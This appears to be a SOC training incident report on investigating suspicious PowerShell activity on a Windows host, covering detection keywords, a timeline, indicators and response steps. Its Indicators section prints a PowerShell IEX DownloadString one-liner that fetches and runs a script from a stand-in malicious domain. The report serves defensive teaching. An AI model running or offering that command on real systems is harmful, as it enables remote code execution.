# Incident Report: Suspicious Powershell Activity

This Report demonstrates how potentially malicious PowerShell activity could be investigated in a SOC enviroment using process creation logs and command line analysis.

---

## Summary 

Suspicious PowerShell execution was detected on a Windows host. The command line contained indicators of script download behavior which is commonly associated with malware or attacker activity.

---

## Detection

This activity was identified using the following KQL detection:

 - [Suspicious PowerShell Execution Detection](../detections/powershell-suspicious-commandline.kql.md)

The alert triggered based on:

- PowerShell process execution (Event ID 4688)
- suspicious command line arguments such as:
  - `Invoke WebRequest`
  - `DownloadString`
  - `EncodedCommand`

---

## Timeline

- 14:02 - PowerShell process created on host `WIN-01`
- 14:02 - Suspicious command detected in command line
- 14:03 - Alert triggered in SIEM
- 14:05 - Investigation initiated

---

## Indicators

- **Host:** WIN-01
- **User Account:** user1
- **Process:** powershell.exe
- **Command Line:**

`powershell -c "IEX(New-ObjectNet.WebClient).DownloadString('http://malicious-site.com/script.ps1')"`

 - Potential External Domain: malicious-site.com

---

## Investigation

Steps taken:

 1. Reviewed process creation logs (Event ID 4688)
 2. Analyzed the PowerShell comman line
 3. Identified use of `DownloadString` which indicates remote script execution
 4. Checked the domain reputation (suspicious/untrusted)
 5. Review additional activity on the host:
    - no legitimate administrative task associated
    - nom known IT automation using this pattern

---

## Assessment

This activity is **likely malicious** due to:

 - use of PowerShell to download external content
 - execution of remote script in memory
 - lack of legitimate buisiness justification

This behavior is commonly associated with:

 - malware delivery
 - fileless attacks
 - command and control activity

---

## Response

 - Isolated the affected host from the network
 - Terminated the PowerShell process
 - Blocked the external domain at the firewall
 - Initiated endpoint scan for presistense or malware
 - Notified security team for further review

---

## Lessons Learned

 - PowerShell is a high risk tool should be monitored closely
 - Command line logging is critical for detecting malicious activity
 - Detection rules should be tuned to reduce noise while catching real threats

---
